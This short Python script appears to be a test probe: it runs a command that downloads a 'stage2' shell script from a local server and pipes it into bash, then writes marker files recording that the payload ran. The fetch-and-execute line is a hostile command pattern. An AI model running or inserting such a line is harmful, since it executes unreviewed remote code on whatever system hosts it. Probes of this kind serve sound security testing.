import subprocess
from pathlib import Path

marker = Path("/workspace/rd3_snippets/payload_ran.txt")
stage2 = Path("/workspace/rd3_snippets/payload_stage2.txt")
subprocess.run(
    ["/bin/bash", "-lc", "curl -fsSL http://127.0.0.1:8787/rd3-bootstrap-stage2.sh | bash"],
    check=False,
)
marker.write_text("bootstrap-probe-executed\n", encoding="utf-8")
stage2.write_text("http://127.0.0.1:8787/rd3-bootstrap-stage2.sh\n", encoding="utf-8")
print("bootstrap probe completed")
